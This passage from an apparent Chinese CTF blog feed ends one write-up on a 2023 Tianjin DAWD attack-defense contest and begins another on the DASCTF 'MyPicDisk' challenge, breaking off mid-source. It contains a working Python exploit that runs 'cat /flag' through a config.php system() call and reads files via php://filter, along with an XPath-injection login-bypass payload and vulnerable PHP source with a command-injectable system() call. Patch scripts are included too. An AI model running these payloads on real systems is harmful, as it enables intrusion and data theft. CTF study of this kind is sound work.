class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$pic</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pic</span> != <span class="hljs-literal">null</span>)&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:image/jpeg&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pic</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>参数file直接作为变量进行<code>file_get_contents</code>，没有对变量进行过滤，导致直接<code>?c=index&amp;a=show_pic&amp;file=/flag</code>就可以拿到flag</p><p>这里直接贴上我的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># 正则匹配flag</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_flag</span> (<span class="hljs-built_in">str</span>):<br>    pattern = <span class="hljs-string">r&#x27;^flag\&#123;.*\&#125;$&#x27;</span><br>    result = re.<span class="hljs-keyword">match</span>(pattern, <span class="hljs-built_in">str</span>).group(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># 初始化</span><br><span class="hljs-keyword">try</span>:<br>    HOST = sys.argv[<span class="hljs-number">1</span>]<br>    PORT = sys.argv[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">pass</span><br><br><br>url=<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;HOST&#125;</span>:<span class="hljs-subst">&#123;PORT&#125;</span>/config/config.php?0=system&quot;</span><br>uri=<span class="hljs-string">&quot;&quot;</span><br>target=url+uri<br>data=&#123;<br>    <span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;cat /flag&#x27;</span><br>&#125;<br>url2=<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;HOST&#125;</span>:<span class="hljs-subst">&#123;PORT&#125;</span>/?c=index&amp;a=show_pic&amp;file=php://filter/resource=/flag&quot;</span><br><br><br><span class="hljs-keyword">try</span>:<br>    a=requests.post(target,data=data)<br>    <span class="hljs-built_in">print</span>(find_flag(a.text))<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    a=requests.post(url2)<br>    <span class="hljs-built_in">print</span>((<span class="hljs-built_in">str</span>(a.text)[-<span class="hljs-number">43</span>:-<span class="hljs-number">1</span>]))<br><br></code></pre></td></tr></table></figure><p>patch也贴上</p><p>patch.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>python3 patch.py <br>cp index.class.php /var/www/html/controller/index.class.php<br></code></pre></td></tr></table></figure><p>index.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">indexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">medoo</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$date</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;time&#x27;</span>);<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$date</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;today&#x27;</span>:<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;today&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;yestoday&#x27;</span>:<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;yestoday&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;before&#x27;</span>:<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;before&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-string">&#x27;today&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;ASHOP&#x27;</span>;<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_cats</span>();<br><br><span class="hljs-variable">$user_data</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$user_data</span>[<span class="hljs-string">&#x27;time&#x27;</span>] = <span class="hljs-title function_ invoke__">time</span>();<br><span class="hljs-variable">$user_data</span>[<span class="hljs-string">&#x27;ip&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;AshopToken&quot;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user_data</span>)));<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$datas</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cat</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$catid</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;cat | ASHOP&#x27;</span>;<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] = <span class="hljs-variable">$catid</span>;<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;cats&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_cats</span>();<br><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$datas</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">more</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$date</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;time&#x27;</span>);<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$date</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;today&#x27;</span>:<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>, <span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;yestoday&#x27;</span>:<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>, <span class="hljs-title function_ invoke__">strtotime</span>(<span class="hljs-string">&#x27;-1 day&#x27;</span>));<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;before&#x27;</span>:<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d&#x27;</span>, <span class="hljs-title function_ invoke__">strtotime</span>(<span class="hljs-string">&#x27;-2 day&#x27;</span>));<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_contents</span>(<span class="hljs-variable">$time</span>);<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_more</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cat_more</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$catid</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;id&#x27;</span>);<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>] = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">cat_contents</span>(<span class="hljs-variable">$catid</span>);<br><br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$datas</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><span class="hljs-comment">//print_r($data);</span><br><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_more</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_pic</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$pic</span> = <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$pic</span>, <span class="hljs-string">&quot;flag&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-variable">$pic</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pic</span> != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:image/jpeg&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pic</span>);<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>patch.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>file_path = <span class="hljs-string">&quot;/var/www/html/config/config.php&quot;</span><br><br><span class="hljs-keyword">try</span>:<br>    os.remove(file_path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;File <span class="hljs-subst">&#123;file_path&#125;</span> has been successfully deleted.&quot;</span>)<br><span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error deleting <span class="hljs-subst">&#123;file_path&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>应急响应考察更多的是一些木马和勒索病毒的知识，模式与ctf答题模式差不多，只不过每道题给分是固定的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次打 dawd 模式，感觉 dawd 是 awd 的简化版，没有不死马这种一次打中每次都能拿分的骚操作，更加考验大家写脚本的速度和熟练度。</p><p>比赛有点水，主要靠dawd攻防拉分，因为我们队第三轮就开始拿分，等别的队伍开始拿分的时候就已经甩开好多分数了。</p><p>应急响应最后只差3道题没答上来，我没做几道题，主要靠队友c，队友tql。</p><p>关于这个比赛感觉初赛入围还是挺容易的，随便会做几道题就可以入围，复赛难度也不大，但是赛前没有培训就很离谱，都打上比赛了才去发提交exp的方法，很多队伍连awd都没怎么参与进来，几乎没有几只队伍防守的充分，导致先拿分的队伍比后拿分的队伍分数高了很多，后拿分的很难追上。</p><p>贴个题目链接：</p><a href="/2023/09/19/2023tianjindawd/0bd38e18b095417ba6108d0da358cf7c.zip" title="web-shop">web-shop</a><br><a href="/2023/09/19/2023tianjindawd/9108dc7d50f1421797eaa6203d5544ab.zip" title="另一道web题，忘记名字了">另一道web题，忘记名字了</a><br><a href="/2023/09/19/2023tianjindawd/e79e25ed862e454c8118d883dfb30c3b.zip" title="pwn-ttt">pwn-ttt</a><p>还有一道pwn题找不到了。。。</p>]]></content>
    
    
    <categories>
      
      <category>awd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>php</tag>
      
      <tag>awd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[DASCTF 2023 &amp; 0X401七月暑期挑战赛] MyPicDisk</title>
    <link href="/2023/07/27/2023dasctf_MyPicDisk/"/>
    <url>/2023/07/27/2023dasctf_MyPicDisk/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>开启容器，发现以下表单，表单信息通过post方法传送</p><img src="/2023/07/27/2023dasctf_MyPicDisk/1.png" class=""><p>通过xpath万能注入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">username<span class="hljs-operator">=</span>admin&#x27;&amp;password<span class="hljs-operator">=</span>&#x27;]|//*|//*[&#x27;&amp;submit<span class="hljs-operator">=</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%99</span><span class="hljs-variable">%BB</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%95</span><br></code></pre></td></tr></table></figure><p>注入成功，burp观察返回包发现注释信息获得提示下载源码&#x2F;y0u_cant_find_1t.zip</p><p>得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FILE</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$lasttime</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$size</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\//i&quot;</span>, <span class="hljs-variable">$filename</span>)) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> != <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;???&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable language_">$this</span>-&gt;lasttime = <span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$filename</span>);<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Filename: &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;filename . <span class="hljs-string">&quot;  Last Modified Time: &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;lasttime . <span class="hljs-string">&quot;  Filesize: &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;size . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls -all &quot;</span> . <span class="hljs-variable">$this</span>-&gt;filename);<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;head&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;MyPicDisk&lt;/title&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    username：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">    password：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; name=&quot;submit&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br>    <span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;/tmp/secret.xml&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &#123;<br>      <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>      <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>      <span class="hljs-variable">$x_query</span> = <span class="hljs-string">&quot;/accounts/user[username=&#x27;<span class="hljs-subst">&#123;$username&#125;</span>&#x27; and password=&#x27;<span class="hljs-subst">&#123;$password&#125;</span>&#x27;]&quot;</span>;<br>      <span class="hljs-variable">$result</span> = <span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$x_query</span>);<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$result</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;登录失败&#x27;</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;登录成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>      &#125;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;<br>      <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &#123;<br>      <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&quot;.&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="hljs-variable">$filename</span>)) &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span><br><span class="hljs-string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">  &#x27;</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &#123;<br>        <span class="hljs-variable">$filename</span> = <span 